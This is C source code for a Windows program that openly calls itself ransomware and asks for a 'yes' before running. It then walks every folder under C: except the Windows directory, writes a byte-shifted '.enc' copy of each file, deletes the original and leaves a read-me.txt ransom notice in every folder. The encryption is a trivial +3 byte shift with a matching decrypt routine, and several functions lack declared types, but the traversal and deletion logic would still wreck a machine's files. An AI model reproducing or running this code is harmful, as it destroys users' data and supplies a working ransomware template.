#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <tchar.h>
#include <locale.h>
#include <wchar.h>

char* convertWCharToChar(wchar_t* wcharToConvert);

#define INVALID_FOLDER 0x16

int main() {
	char userInput[256];
	printf("Are you sure to run the ransomware?");
	scanf("%s", userInput);

	if (strcmp(userInput, "yes") == 0) {
		setLocaleUTF8ToAvoidChineseCharErrors();
		iterateFolder("C:");
	}
	scanf("%s", userInput);
}

setLocaleUTF8ToAvoidChineseCharErrors() {
	_wsetlocale(LC_ALL, L".UTF8");
}

createReadmeFile(char path[]) {
	char fullPath[260];
	char fileName[] = "/read-me.txt";
	strcpy(fullPath, path);
	strcat(fullPath, fileName);

	FILE *file = fopen(fullPath, "w");

	fputs("What happened with your files?\r\n\r\n", file);
	fputs("Your files were encrypted by a ransomware", file);

	fclose(file);
}

iterateFolder(char initialPath[]) {

	
	if (strstr(initialPath, "C:\\Windows") != NULL) {
		printf("Skipping windows folder");
		return;
	}

	char path[260];

	strcpy(path, initialPath);
	strcat(path, "\\*");

	WIN32_FIND_DATA fdata;
	HANDLE hFind = NULL;

	hFind = FindFirstFileA(path, &fdata);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("Path not found or invalid: %d", GetLastError());
		return;
	}

	do {
		if (hFind == INVALID_HANDLE_VALUE || fdata.dwFileAttributes == INVALID_FOLDER) {
			continue;
		}
		if (strcmp(fdata.cFileName, ".") != 0 && strcmp(fdata.cFileName, "..") != 0 ) {
			if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

				char subFolder[260];
				strcpy(subFolder, initialPath);
				strcat(subFolder, "\\");
				char* convertedFolder = convertWCharToChar(fdata.cFileName);
				strcat(subFolder, convertedFolder);
				iterateFolder(subFolder);
				createReadmeFile(subFolder);

			}
			else {
				char fullFilePath[2048];
				char* convertedFileName = convertWCharToChar(fdata.cFileName);
				strcpy(fullFilePath, initialPath);
				strcat(fullFilePath, "\\");
				strcat(fullFilePath, convertedFileName);
				char encryptedFilePath[2048];
				strcpy(encryptedFilePath, fullFilePath);
				strcat(encryptedFilePath, ".enc");
				printf("%s\r\n", fullFilePath);
				encryptFile(fullFilePath, encryptedFilePath);
				remove(fullFilePath);
			}
		}
	} while (FindNextFile(hFind, &fdata));
	FindClose(hFind);
}

encryptFile(char sourceFilePath[], char destitationFilePath[]) {
	FILE *sourceFile = fopen(sourceFilePath, "rb");
	FILE *destinationFile = fopen(destitationFilePath, "wb");

	if (!sourceFile || !destinationFile) {
		printf("An error has occured while opening source/destination files");
		return;
	}

	int c;	

	do {
		c = fgetc(sourceFile);
		fputc(c + 3, destinationFile);
	} while (c != EOF);

	fclose(sourceFile);
	fclose(destinationFile);
}

decryptFile(char sourceFilePath[], char destitationFilePath[]) {
	FILE* sourceFile = fopen(sourceFilePath, "rb");
	FILE* destinationFile = fopen(destitationFilePath, "wb");

	if (!sourceFile || !destinationFile) {
		printf("An error has occured while opening source/destination files");
		return;
	}

	int c;

	c = fgetc(sourceFile);

	while (c != EOF) {
		fputc(c - 3, destinationFile);
		c = fgetc(sourceFile);
	}

	fclose(sourceFile);
	fclose(destinationFile);
}

char* convertWCharToChar(wchar_t* wchar) {
	int size = wcstombs(NULL, wchar, 0);
	char* convertedPath = (char*)malloc(size + 1);
	wcstombs(convertedPath, wchar, size + 1);
	return convertedPath;
}